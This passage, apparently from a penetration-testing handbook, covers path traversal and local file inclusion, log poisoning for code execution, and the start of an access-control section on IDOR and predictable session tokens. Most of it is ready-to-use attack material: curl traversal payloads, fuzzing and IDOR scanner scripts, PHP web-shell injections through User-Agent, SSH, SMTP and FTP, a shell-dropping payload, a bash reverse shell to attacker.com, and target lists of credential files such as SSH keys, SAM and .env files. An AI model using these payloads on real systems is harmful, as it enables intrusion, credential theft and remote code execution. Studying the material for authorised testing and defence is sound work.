# Fuzz with absolute paths
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/Traversal.txt \
  "http://target.com/file?path=FUZZ/etc/passwd"

# Filter successful responses
wfuzz -c --hc 404 -z file,traversal_list.txt \
  "http://target.com/download?file=FUZZ"
```

## Null Byte Injection

### Mechanism

[**Note:** Effectiveness depends on backend language/version. Modern PHP (5.3.4+), Python 3, and recent frameworks typically block null bytes]

**Historical exploitation (PHP < 5.3.4, Perl, C/C++):**

```bash
# Application appends extension: user_input + ".pdf"
# Null byte terminates string in C-based functions

# Bypass extension check
curl "http://target.com/file?name=../../../../etc/passwd%00"

# Extension gets appended but ignored
# Final path: ../../../../etc/passwd\0.pdf
# C functions read: ../../../../etc/passwd
```

### Encoding Variations

**Different null byte representations:**

```bash
# URL encoded
%00

# Unicode
%u0000

# Double encoded  
%2500

# Example payloads
../../../../etc/passwd%00.jpg
../../../../etc/passwd%00.pdf
..%2f..%2f..%2fetc%2fpasswd%2500.png
```

### Testing Script

```bash
#!/bin/bash
# null_byte_tester.sh

TARGET="http://target.com/download"
PARAM="file"
PAYLOADS=(
    "../../../../etc/passwd%00"
    "../../../../etc/passwd%2500"
    "..%2f..%2f..%2fetc%2fpasswd%00"
    "/etc/passwd%00"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[*] Testing: $payload"
    response=$(curl -s "${TARGET}?${PARAM}=${payload}")
    if echo "$response" | grep -q "root:"; then
        echo "[+] SUCCESS: $payload"
        echo "$response"
    fi
done
```

## Backslash Exploitation (Windows)

### Windows Path Handling

**Key differences:**

- Windows accepts both `\` and `/` as path separators
- Case-insensitive filesystem
- Alternate Data Streams (ADS)
- Short filename (8.3) format

### Basic Backslash Traversal

```bash
# Standard traversal
curl "http://target.com/file?path=..\..\..\windows\system32\drivers\etc\hosts"

# Mixed separators (normalization exploit)
curl "http://target.com/file?path=../..\../windows/system32/config/sam"

# Encoded backslash
curl "http://target.com/file?path=..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
```

### IIS-Specific Exploitation

**IIS parsing quirks:**

```bash
# Backslash normalization bug
curl "http://target.com/file.asp?path=..\..\..\windows\win.ini"

# Unicode backslash
curl "http://target.com/file?path=%u002e%u002e%u005c%u002e%u002e%u005cwindows%u005cwin.ini"

# Short filename format (8.3)
curl "http://target.com/file?path=..\..\..\..\PROGRA~1\COMMON~1\file.txt"
```

### Alternate Data Streams (ADS)

**Reading ADS:**

```bash
# Format: filename:stream_name
curl "http://target.com/file?path=..\..\..\test.txt:hidden_stream"

# Common ADS names
curl "http://target.com/file?path=..\..\..\file.txt:$DATA"
curl "http://target.com/file?path=..\..\..\secret.doc:Zone.Identifier"
```

### UNC Path Injection

[**Inference:** Success depends on server configuration and SMB access]

```bash
# Force server to authenticate to attacker's SMB
curl "http://target.com/file?path=\\attacker.com\share\file.txt"

# Combined with traversal
curl "http://target.com/file?path=..\..\..\..\\attacker.com\share\capture_hash.txt"
```

**Responder capture setup:**

```bash
# Start Responder to capture NTLMv2 hash
sudo responder -I eth0 -wF

# Trigger UNC path from target
curl "http://target.com/file?path=\\YOUR_IP\share\test.txt"
```

## Tool Arsenal

### ffuf - Fast Web Fuzzer

```bash
# Basic path traversal fuzzing
ffuf -u "http://target.com/file?path=FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200

# With traversal wordlist
ffuf -u "http://target.com/download?file=FUZZ/etc/passwd" \
  -w traversal_depths.txt \
  -fs 0

# POST parameter fuzzing
ffuf -u "http://target.com/upload" \
  -X POST \
  -d "filename=FUZZ" \
  -w payloads.txt \
  -mc 200,301,302
```

### Burp Suite Intruder

**Positions setup:**

```
GET /download?file=Â§payloadÂ§ HTTP/1.1
Host: target.com
```

**Payload processing:**

1. Payload Sets â†’ Load traversal wordlist
2. Payload Processing â†’ Add rule:
    - Rule: URL-encode these characters: `../%`
3. Options â†’ Grep-Match: `root:`, `Administrator`

### Custom Python Exploitation

```python
#!/usr/bin/env python3
import requests
import urllib.parse

def test_traversal(url, param, target_file, max_depth=10):
    """Test path traversal with incremental depth"""
    
    encodings = [
        lambda p: p,  # Plain
        lambda p: urllib.parse.quote(p),  # URL encode
        lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # Double encode
        lambda p: p.replace('../', '..%2f'),  # Hybrid
        lambda p: p.replace('.', '%2e').replace('/', '%2f'),  # Full encode
    ]
    
    for depth in range(1, max_depth + 1):
        traversal = '../' * depth + target_file
        
        for encode_func in encodings:
            payload = encode_func(traversal)
            test_url = f"{url}?{param}={payload}"
            
            try:
                resp = requests.get(test_url, timeout=5)
                
                # Check for success indicators
                if 'root:' in resp.text or 'Administrator' in resp.text:
                    print(f"[+] SUCCESS at depth {depth}")
                    print(f"[+] Encoding: {encode_func.__name__}")
                    print(f"[+] URL: {test_url}")
                    print(f"[+] Response preview:\n{resp.text[:200]}")
                    return True
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Error: {e}")
                continue
    
    return False

# Usage
test_traversal("http://target.com/download", "file", "etc/passwd")
```

## Defense Detection

[**Inference:** These patterns suggest security controls]

**Indicators of filtering:**

- Empty response with different payload variations
- Identical responses for `../etc/passwd` and `legitimate_file.txt`
- HTTP 403/400 for encoded payloads but 404 for normal requests
- WAF signatures in response headers (X-WAF, Server: cloudflare)

**Bypass strategies when filters detected:**

- Test all encoding combinations systematically
- Use OS-specific features (Windows: backslash, 8.3 names; Linux: `/proc`, symlinks)
- Case variation on case-insensitive systems
- Append valid path after traversal: `../../../etc/passwd/../../var/www/html/valid.txt`

---

## Case Sensitivity Bypass

Case sensitivity differences between filesystems and application validation can be exploited to bypass path traversal filters.

**Filesystem Case Sensitivity:**

**Linux/Unix (case-sensitive):**

```bash
/etc/passwd â‰  /etc/Passwd â‰  /etc/PASSWD
/var/www/html â‰  /var/WWW/html

# Files must match exact case
```

**Windows (case-insensitive):**

```bash
C:\Windows\System32 = C:\WINDOWS\system32 = C:\windows\SYSTEM32

# All variations access same file
```

**macOS (default case-insensitive, case-preserving):**

```bash
# APFS/HFS+ default behavior
/Applications/Safari.app = /applications/safari.APP

# Can be configured as case-sensitive
```

**Bypass Techniques:**

**1. Mixed Case Traversal:**

```bash
# If filter blocks "../" exactly
../ â†’ ../  (blocked)
../ â†’ ..\/  (bypass attempt)
../ â†’ ..\/ (Windows)

# Case variations
../../../etc/passwd
.././.././.././etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd

# Mixed case (Windows targets)
..\..\..\WiNdOwS\sYsTeM32\config\SAM
..\..\..\Windows\System32\DriVeRs\etc\hosts
```

**2. Keyword Case Manipulation:**

```bash
# If filter blocks "etc", "passwd", "windows" (case-sensitive)
/etc/passwd â†’ /ETC/passwd  # Blocked on Linux
/etc/passwd â†’ /etc/PASSWD  # Blocked on Linux (different file)
/etc/passwd â†’ /eTc/pAsSwD  # Blocked on Linux (file doesn't exist)

# Windows targets (case-insensitive filesystem)
C:\Windows\System32 â†’ C:\WINDOWS\system32  # Works
C:\Windows\win.ini â†’ C:\WiNdOwS\WIN.INI   # Works
```

**3. Application vs. Filesystem Case Handling:**

```bash
# Application validates case-sensitively, filesystem doesn't (Windows)
# Filter: blocks "../" (lowercase)

# Bypass attempts:
../ â†’ ../  (blocked)
../ â†’ ..\/  (may pass filter, filesystem treats as ../)
../ â†’ ..\  (Windows accepts, may pass filter)
```

**Testing Case Sensitivity:**

```bash
# Identify target OS via HTTP headers
curl -I http://target.com
# Look for: Server: Microsoft-IIS (Windows) vs Apache/nginx (likely Linux)

# Test filesystem case sensitivity
curl "http://target.com/page?file=/etc/passwd"
curl "http://target.com/page?file=/ETC/PASSWD"
curl "http://target.com/page?file=/etc/PASSWD"

# If Windows:
curl "http://target.com/page?file=C:\Windows\win.ini"
curl "http://target.com/page?file=C:\WINDOWS\WIN.INI"
# Both should return same file
```

**Burp Intruder Case Fuzzing:**

```bash
# Payload position
?file=Â§/etc/passwdÂ§

# Payload processing
1. Add from list: /etc/passwd, /ETC/PASSWD, /etc/PASSWD, /Etc/Passwd
2. Check responses for differences

# Case permutation generator (Python)
import itertools
path = "/etc/passwd"
for combo in itertools.product(*[(c.lower(), c.upper()) for c in path]):
    print(''.join(combo))
```

---

## Platform-Specific Traversal

Different operating systems handle path traversal with unique separators, encoding, and filesystem behaviors.

**Path Separators:**

**Unix/Linux:**

```bash
/            # Forward slash (only valid separator)
/etc/passwd  # Absolute path
./file.txt   # Current directory
../file.txt  # Parent directory
```

**Windows:**

```bash
\            # Backslash (primary separator)
/            # Forward slash (also accepted by Windows API)
C:\Windows\System32
C:/Windows/System32  # Also valid

\\?\C:\      # UNC path (bypasses MAX_PATH limit)
\\server\share\file  # Network share
```

**URL Encoding Differences:**

```bash
# Forward slash
/ â†’ %2F â†’ %252F (double encoded)

# Backslash (Windows)
\ â†’ %5C â†’ %255C (double encoded)

# Both work on Windows:
..%2F..%2F..%2Fwindows%2Fwin.ini
..%5C..%5C..%5Cwindows%5Cwin.ini
```

**Linux/Unix-Specific Traversal:**

**1. Standard Traversal:**

```bash
# Basic
../../../etc/passwd
./../../etc/passwd
.././.././.././etc/passwd

# Absolute paths
/etc/passwd
/var/www/html/index.php
/home/user/.ssh/id_rsa
```

**2. Current Directory Tricks:**

```bash
# Unnecessary current directory references
/etc/./passwd
/etc/././passwd
/etc/./././passwd

# Combined with traversal
../../../etc/./passwd
```

**3. Encoded Slashes:**

```bash
# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd

# Double encoded
..%252F..%252F..%252Fetc%252Fpasswd

# Mixed encoding
..%2F..%2F..%2Fetc/passwd
```

**Windows-Specific Traversal:**

**1. Backslash Traversal:**

```bash
..\..\..\Windows\System32\config\SAM
..\..\..\Windows\win.ini
..\..\..\..\boot.ini

# Forward slash also works
../../../Windows/System32/config/SAM
```

**2. Drive Letter Exploitation:**

```bash
# Absolute paths
C:\Windows\win.ini
C:/Windows/win.ini

# Other drives
D:\backups\database.bak
E:\sensitive\data.xlsx
```

**3. UNC Path Injection:**

```bash
# Access network shares
\\localhost\C$\Windows\System32\config\SAM
\\127.0.0.1\C$\Windows\win.ini

# SMB share (may trigger outbound connection)
\\attacker.com\share\file.txt

# [Inference: UNC paths may leak NTLM hashes if application makes authenticated requests]
```

**4. Alternate Data Streams (ADS):**

```bash
# NTFS feature - hidden data streams
file.txt:hidden.txt
C:\Windows\win.ini:secret.txt

# Example
..\..\..\..\Windows\System32\config\SAM:$DATA
```

**5. Short Filename (8.3) Format:**

```bash
# Windows maintains 8.3 filenames for compatibility
C:\Program Files â†’ C:\PROGRA~1
C:\Documents and Settings â†’ C:\DOCUME~1

# Exploitation
..\..\..\..\PROGRA~1\COMMON~1\System\msadc\data.txt
```

**6. Null Byte (legacy Windows):**

```bash
# Pre-Windows Vista/Server 2008
..\..\..\windows\win.ini%00.jpg
# Application validates .jpg extension
# Windows truncates at null byte

# [Unverified: Requires legacy Windows version without null byte protections]
```

**Testing Platform-Specific Traversal:**

**OS Detection:**

```bash
# HTTP headers
curl -I http://target.com | grep Server
# Server: Microsoft-IIS/10.0 â†’ Windows
# Server: Apache/2.4.41 (Ubuntu) â†’ Linux

# Error messages
curl "http://target.com/page?file=invalid"
# Windows errors: "The system cannot find the path specified"
# Linux errors: "No such file or directory"

# Default files
curl "http://target.com/page?file=/etc/passwd"  # Linux
curl "http://target.com/page?file=C:\Windows\win.ini"  # Windows
```

**Burp Suite Platform Testing:**

```bash
# Intruder payload positions
?file=Â§payloadÂ§

# Linux payloads
../../../etc/passwd
/etc/passwd
/proc/self/environ

# Windows payloads
..\..\..\Windows\win.ini
C:\Windows\win.ini
\\localhost\C$\Windows\win.ini
```

---

## Accessing Sensitive Files

**Linux/Unix Sensitive Files:**

**1. User Information:**

```bash
/etc/passwd
# Contains: usernames, UIDs, GIDs, home directories, shells
# Format: username:x:UID:GID:comment:home:shell
# Example: root:x:0:0:root:/root:/bin/bash

/etc/shadow
# Contains: password hashes (requires root privileges)
# Format: username:$algorithm$salt$hash:lastchange:min:max:warn:inactive:expire
# Readable only by root

/etc/group
# Contains: group names, GIDs, group members

/etc/sudoers
# Sudo configuration (which users can run what as root)
```

**2. System Configuration:**

```bash
/etc/hosts
# Hostname to IP mappings

/etc/hostname
# System hostname

/etc/resolv.conf
# DNS resolver configuration

/etc/network/interfaces
# Network interface configuration (Debian/Ubuntu)

/etc/sysconfig/network-scripts/ifcfg-eth0
# Network configuration (Red Hat/CentOS)

/etc/fstab
# Filesystem mount configuration
```

**3. Application Configuration:**

```bash
/var/www/html/.env
# Environment variables (often contains credentials)

/var/www/html/config.php
# Web application configuration

/etc/apache2/apache2.conf
# Apache configuration
/etc/apache2/sites-enabled/000-default.conf

/etc/nginx/nginx.conf
# Nginx configuration

/etc/mysql/my.cnf
# MySQL configuration

/root/.bash_history
# Root command history

/home/user/.bash_history
# User command history

/home/user/.ssh/id_rsa
# SSH private key

/home/user/.ssh/authorized_keys
# SSH authorized public keys
```

**4. Process Information (procfs):**

```bash
/proc/self/environ
# Current process environment variables (may contain secrets)

/proc/self/cmdline
# Command line of current process

/proc/self/status
# Process status information

/proc/self/fd/0
# File descriptor 0 (stdin) - may contain request data

/proc/version
# Kernel version

/proc/cpuinfo
# CPU information

/proc/mounts
# Mounted filesystems

/proc/net/tcp
# Active TCP connections

/proc/net/fib_trie
# Network routing information (may reveal internal IPs)
```

**5. Log Files:**

```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
# Apache logs

/var/log/nginx/access.log
/var/log/nginx/error.log
# Nginx logs

/var/log/auth.log
# Authentication logs (SSH logins, sudo usage)

/var/log/syslog
# System logs

/var/log/mysql/error.log
# MySQL error logs

/var/log/messages
# General system messages

/var/log/secure
# Security-related messages (Red Hat/CentOS)
```

**Windows Sensitive Files:**

**1. System Configuration:**

```bash
C:\Windows\win.ini
# Windows initialization file (legacy)

C:\Windows\System32\drivers\etc\hosts
# Hosts file

C:\Windows\System32\config\SAM
# Security Account Manager (password hashes)
# Locked while Windows running

C:\Windows\System32\config\SYSTEM
# System registry hive

C:\boot.ini
# Boot configuration (legacy, pre-Vista)

C:\Windows\System.ini
# System initialization (legacy)
```

**2. IIS Configuration:**

```bash
C:\inetpub\wwwroot\web.config
# IIS application configuration (may contain connection strings)

C:\Windows\System32\inetsrv\config\applicationHost.config
# IIS server configuration

C:\inetpub\logs\LogFiles\W3SVC1\
# IIS access logs
```

**3. Application Data:**

```bash
C:\Users\Administrator\Desktop\
# Administrator desktop files

C:\Users\Administrator\Documents\
# Documents

C:\Users\[username]\AppData\Roaming\
# Application data

C:\ProgramData\
# Shared application data

C:\xampp\htdocs\
# XAMPP web root (if installed)

C:\wamp\www\
# WAMP web root (if installed)
```

**4. Credentials & Secrets:**

```bash
C:\unattend.xml
C:\Windows\Panther\unattend.xml
# Windows installation answers (may contain passwords)

C:\Windows\System32\config\RegBack\
# Registry backup (may contain SAM)

C:\Users\[username]\.aws\credentials
# AWS credentials

C:\Users\[username]\.ssh\id_rsa
# SSH private key
```

**Testing File Access:**

**Manual Testing:**

```bash
# Linux targets
curl "http://target.com/page?file=../../../etc/passwd"
curl "http://target.com/page?file=/etc/passwd"
curl "http://target.com/page?file=....//....//....//etc/passwd"

# Windows targets
curl "http://target.com/page?file=..\..\..\Windows\win.ini"
curl "http://target.com/page?file=C:\Windows\win.ini"
curl "http://target.com/page?file=..%5C..%5C..%5CWindows%5Cwin.ini"
```

**Burp Intruder Wordlist:**

```bash
# Create payload file: lfi_files.txt
../../../etc/passwd
../../../etc/shadow
../../../etc/group
../../../var/www/html/.env
../../../proc/self/environ
..\..\..\Windows\win.ini
..\..\..\Windows\System32\config\SAM
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config

# Load in Intruder â†’ Payloads â†’ Load
```

**Automated Tools:**

**dotdotpwn:**

```bash
# HTTP module
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:"

# -m: module (http, ftp, tftp, payload, stdout)
# -h: target host
# -x: port
# -f: target file
# -k: keyword to identify successful retrieval
# -d: traversal depth (default 6)

# Example output shows working traversal depth
```

**LFISuite:**

```bash
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite
python3 lfisuite.py

# Interactive menu:
1. Automatic exploitation
2. Enter URL with [LFI] placeholder
# Example: http://target.com/page?file=[LFI]

# Tests multiple traversal techniques and common files
```

---

## Log File Poisoning

Log poisoning exploits writable log files accessed via path traversal to achieve code execution.

**Attack Flow:**

1. Identify accessible log file via LFI
2. Inject malicious code into log entries
3. Access poisoned log via LFI
4. Injected code executes

**Common Poisonable Logs:**

**1. Apache/Nginx Access Logs:**

**Location:**

```bash
# Apache
/var/log/apache2/access.log
/var/log/httpd/access.log
/usr/local/apache2/logs/access.log

# Nginx
/var/log/nginx/access.log
```

**Log Format:**

```bash
# Standard Combined Log Format
127.0.0.1 - - [14/Oct/2025:10:30:15 +0000] "GET /page.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
# IP - - [timestamp] "METHOD PATH PROTOCOL" STATUS SIZE "REFERER" "USER-AGENT"
```

**Injection via User-Agent:**

```bash
# Inject PHP code in User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# User-Agent logged as:
127.0.0.1 - - [14/Oct/2025:10:30:15 +0000] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"

# Access poisoned log
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami"
```

**Burp Suite Poisoning:**

```bash
# 1. Intercept any request to target
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0

# 2. Modify User-Agent
User-Agent: <?php system($_GET['cmd']); ?>

# 3. Send request (poisons log)

# 4. Access via LFI
GET /page.php?file=../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
```

**2. SSH Authentication Logs:**

**Location:**

```bash
/var/log/auth.log    # Debian/Ubuntu
/var/log/secure      # Red Hat/CentOS
```

**Log Format:**

```bash
Oct 14 10:30:15 server sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 52312 ssh2
```

**Injection via SSH Username:**

```bash
# Attempt SSH login with malicious username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Logged as:
Oct 14 10:30:15 server sshd[1234]: Failed password for invalid user <?php system($_GET["cmd"]); ?> from 192.168.1.100 port 52312 ssh2

# Access poisoned log
curl "http://target.com/page.php?file=../../../../var/log/auth.log&cmd=whoami"
```

**Automated SSH Poisoning:**

```bash
# Python script
import paramiko
import socket

target = "target.com"
malicious_user = "<?php system($_GET['cmd']); ?>"

try:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(target, username=malicious_user, password="wrong")
except:
    pass  # Login fails but username logged

print(f"[+] Log poisoned. Access: /page.php?file=../../../../var/log/auth.log&cmd=id")
```

**3. Email Logs (Mail Server):**

**Location:**

```bash
/var/log/mail.log
/var/log/maillog
```

**Injection via SMTP:**

```bash
# Telnet to SMTP server
telnet target.com 25

# SMTP commands with payload
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: user@target.com
DATA
Subject: Test
<?php system($_GET['cmd']); ?>
.
QUIT

# Access poisoned log
curl "http://target.com/page.php?file=../../../../var/log/mail.log&cmd=id"
```

**4. PHP Session Files:**

**Location:**

```bash
/var/lib/php/sessions/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]

# SESSION_ID from cookie: PHPSESSID=abc123xyz
# File: /var/lib/php/sessions/sess_abc123xyz
```

**Session File Format:**

```bash
# Standard PHP session
username|s:5:"admin";role|s:4:"user";
```

**Injection via Session Variable:**

```php
<?php
// Vulnerable code
session_start();
$_SESSION['username'] = $_GET['user'];  // No sanitization
?>

<!-- Exploit -->
http://target.com/login.php?user=<?php system($_GET['cmd']); ?>

<!-- Session file contents -->
username|s:29:"<?php system($_GET['cmd']); ?>";

<!-- Access via LFI -->
http://target.com/page.php?file=../../../../var/lib/php/sessions/sess_abc123xyz&cmd=whoami
```

**5. FTP Logs:**

**Location:**

```bash
/var/log/vsftpd.log
/var/log/proftpd/proftpd.log
```

**Injection:**

```bash
# FTP login with malicious username
ftp target.com
Name: <?php system($_GET['cmd']); ?>
Password: anything

# Access poisoned log
curl "http://target.com/page.php?file=../../../../var/log/vsftpd.log&cmd=id"
```

**Advanced Log Poisoning Techniques:**

**1. Polyglot Payloads:**

```bash
# Valid in multiple contexts (log format + PHP)
User-Agent: <?php system($_GET['c']); ?> # Comment
Referer: https://evil.com/<?php system($_GET['c']); ?>

# Ensures parsing even if log format changes
```

**2. Encoded Payloads:**

```bash
# URL-encoded (may bypass filters)
User-Agent: %3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E

# Base64 in log, decode via PHP
User-Agent: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

**3. Multi-Stage Payloads:**

```bash
# Stage 1: Poison log with file write capability
User-Agent: <?php file_put_contents('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>'); ?>

# Stage 2: Access poisoned log to execute file_put_contents
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log"

# Stage 3: Access written shell
curl "http://target.com/page.php?file=../../../../tmp/shell.php&cmd=whoami"
```

**4. Race Condition Exploitation:**

```bash
# If logs rotate/clear frequently
# Send multiple requests simultaneously

# Terminal 1: Poison log continuously
while true; do curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/; done

# Terminal 2: Access log repeatedly
while true; do curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id"; done
```

**Defense Detection & Bypass:**

**Null Byte in Log Access:**

```bash
# If log path filtered
/var/log/apache2/access.log â†’ blocked

# Null byte (legacy)
../../../../var/log/apache2/access.log%00

# Path variations
../../../../var/log/apache2/./access.log
../../../../var/log/apache2/access.log%20
```

**Log Rotation Handling:**

```bash
# Logs often rotated: access.log â†’ access.log.1
# Test multiple files
../../../../var/log/apache2/access.log
../../../../var/log/apache2/access.log.1
../../../../var/log/apache2/access.log.2.gz  # Compressed logs

# Recent entries likely in .log, older in .log.1, etc.
```

**Testing Log Poisoning Workflow:**

```bash
# 1. Identify LFI vulnerability
curl "http://target.com/page.php?file=../../../../etc/passwd"
# If returns /etc/passwd contents â†’ LFI confirmed

# 2. Test log file access
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log"
# Check if log contents returned

# 3. Poison log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 4. Execute via LFI
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami"
# Look for command output in response

# 5. If successful, escalate to reverse shell
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
```

---

## Comprehensive Testing Methodology

**1. Reconnaissance:**

```bash
# Identify potential LFI parameters
?file=
?path=
?page=
?document=
?folder=
?root=
?load=

# Test basic traversal
?file=../../../etc/passwd
```

**2. Depth Testing:**

```bash
# Start with depth 3, increment if needed
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Maximum reasonable depth: ~10-15
```

**3. Encoding Testing:**

```bash
# Standard URL encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd

# UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# [Unverified: UTF-8 overlong encoding effectiveness varies by parser]
```

**4. Platform-Specific Testing:**

```bash
# Linux
../../../etc/passwd
/etc/passwd
/proc/self/environ

# Windows
..\..\..\Windows\win.ini
C:\Windows\win.ini
\\localhost\C$\Windows\win.ini
```

**5. Sensitive File Enumeration:**

```bash
# Use wordlist of common sensitive files
# Automate with Burp Intruder or custom script

for file in $(cat lfi_wordlist.txt); do
    curl "http://target.com/page.php?file=$file" | grep -q "root:" && echo "[+] $file"
done
```

**6. Log Poisoning Attempt:**

```bash
# If file read successful, attempt poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
```

---

## Important Related Topics

**LFI to RCE Techniques:**

- PHP wrappers (php://filter, php://input, data://, expect://)
- Session file poisoning
- /proc/self/environ exploitation
- Temporary file inclusion races

**Advanced Traversal:**

- Filter bypass with encodings (UTF-8, double encoding, mixed encoding)
- Wrapper abuse for arbitrary code execution
- Combining LFI with other vulnerabilities (SQLi, XXE, RFI)

**Post-Exploitation:**

- Extracting database credentials from config files
- Reading source code for additional vulnerabilities
- Accessing SSH keys for lateral movement
- Database file access (SQLite databases via LFI)

---

# Broken Access Control

Broken Access Control represents failures in enforcing restrictions on authenticated users' permissions. Attackers exploit these gaps to access unauthorized functionality or data, manipulating identifiers, tampering with parameters, or bypassing authentication/authorization checks.

## Insecure Direct Object References (IDOR)

IDOR vulnerabilities occur when applications expose direct references to internal implementation objects (files, directories, database keys) without proper access control validation. Attackers modify parameters to access resources belonging to other users.

**Core Identification Techniques:**

Parameter manipulation focuses on any user-controllable input referencing resources:
- URL path segments: `/user/profile/1234` â†’ `/user/profile/1235`
- Query parameters: `?document_id=456` â†’ `?document_id=457`
- POST body parameters: `{"user_id": 100}` â†’ `{"user_id": 101}`
- Cookie values: `session_user=alice` â†’ `session_user=admin`
- HTTP headers: `X-User-ID: 5` â†’ `X-User-ID: 1`

**Enumeration Methodology:**

Using Burp Suite Intruder for systematic IDOR testing:

```bash
# Capture request in Burp Proxy
# Send to Intruder (Ctrl+I)
# Position payload markers around target parameter
```

Intruder attack configuration:
- Attack type: Sniper (single parameter) or Cluster Bomb (multiple parameters)
- Payload type: Numbers (sequential) with step value 1
- Grep Match: Add strings indicating success ("balance", "email", "ssn")
- Grep Extract: Extract specific data fields from responses

```bash
# CLI alternative using ffuf for IDOR enumeration
ffuf -u "https://target.com/api/user/FUZZ" -w <(seq 1 10000) -mc 200 -fs 0

# With authentication header
ffuf -u "https://target.com/api/documents/FUZZ" \
     -w <(seq 1 5000) \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -mc 200,201 \
     -fw 10  # Filter by word count to identify different responses
```

**Advanced IDOR Testing:**

Non-sequential identifiers require pattern analysis:
- UUID/GUID formats: `550e8400-e29b-41d4-a716-446655440000`
- Hash-based IDs: MD5/SHA variants
- Encoded values: Base64, hex, custom encoding schemes

```bash
# Base64-encoded ID manipulation
echo "dXNlcjEyMzQ=" | base64 -d  # Returns: user1234
echo "user1235" | base64  # Returns: dXNlcjEyMzU=

# Testing with decoded then re-encoded values
curl -X GET "https://target.com/profile?id=dXNlcjEyMzU=" \
     -H "Cookie: session=abc123"
```

**Mass Assignment IDOR Variant:**

Exploiting parameter binding in POST/PUT requests:

```bash
# Original legitimate request
curl -X POST "https://target.com/api/profile" \
     -H "Content-Type: application/json" \
     -d '{"name":"John","email":"john@test.com"}'

# Injecting unauthorized parameters
curl -X POST "https://target.com/api/profile" \
     -H "Content-Type: application/json" \
     -d '{"name":"John","email":"john@test.com","role":"admin","is_premium":true}'
```

**File-based IDOR:**

```bash
# Path traversal combined with IDOR
curl "https://target.com/download?file=../../../../etc/passwd"
curl "https://target.com/download?file=../../uploads/user_123_document.pdf"

# Using wfuzz for file IDOR enumeration
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt \
      -u "https://target.com/files/FUZZ" \
      --hc 404
```

**Blind IDOR Detection:**

When responses don't directly reveal data but actions succeed:

```bash
# Monitor state changes
# 1. Access your own resource, note state
curl "https://target.com/api/order/YOUR_ID"

# 2. Perform action on target resource
curl -X DELETE "https://target.com/api/order/TARGET_ID" \
     -H "Cookie: session=YOUR_SESSION"

# 3. Check if action succeeded through side channels
# - Check email notifications
# - Look for state changes in application
# - Monitor database queries if available (time-based)
```

**Automated IDOR Scanner:**

Custom Python script for IDOR detection:

```python
import requests
import sys

def test_idor(base_url, param_name, start_id, end_id, cookies):
    vulnerable = []
    
    for user_id in range(start_id, end_id + 1):
        url = f"{base_url}?{param_name}={user_id}"
        response = requests.get(url, cookies=cookies)
        
        # Analyze response for successful access
        if response.status_code == 200:
            # Check content length variation
            if len(response.content) > 100:  # Adjust threshold
                print(f"[+] Potential IDOR: {url} (Size: {len(response.content)})")
                vulnerable.append(user_id)
    
    return vulnerable

# Usage:
# python3 idor_scanner.py
cookies = {"session": "your_session_token"}
test_idor("https://target.com/profile", "id", 1, 1000, cookies)
```

## Horizontal Privilege Escalation

Horizontal privilege escalation allows attackers to access resources belonging to other users at the same privilege level. This differs from IDOR by focusing on lateral movement between peer accounts.

**Account Enumeration:**

Identify valid user accounts before attempting access:

```bash
# Username enumeration via registration
curl -X POST "https://target.com/register" \
     -d "username=admin&password=test123" \
     # Response: "Username already exists"

# Via password reset timing
time curl -X POST "https://target.com/reset" -d "email=admin@target.com"
time curl -X POST "https://target.com/reset" -d "email=nonexistent@target.com"
# Compare response times

# Using Burp Intruder with response differentiation
# Payload: List of potential usernames
# Grep Match: "User found", "Invalid username"
```

**Session Manipulation Techniques:**

Predictable session tokens enable account takeover:

```bash
# Analyze session token entropy
# Collect multiple tokens from different accounts
session1="MTIzNDU2Nzg5MA==" 
session2="MTIzNDU2Nzg5MQ==" 
session3="MTIzNDU2Nzg5Mg=="

# Decode and analyze
echo "$session1" | base64 -d  # 1234567890
echo "$session2" | base64 -d  # 1234567891
echo "$session3" | base64 -d  # 1234567892

# Generate next token
echo -n "1234567893" | base64  # MTIzNDU2Nzg5Mw==
```

**JWT Token Manipulation:**

JSON Web Tokens often contain authorization data:

```bash
# Decode JWT
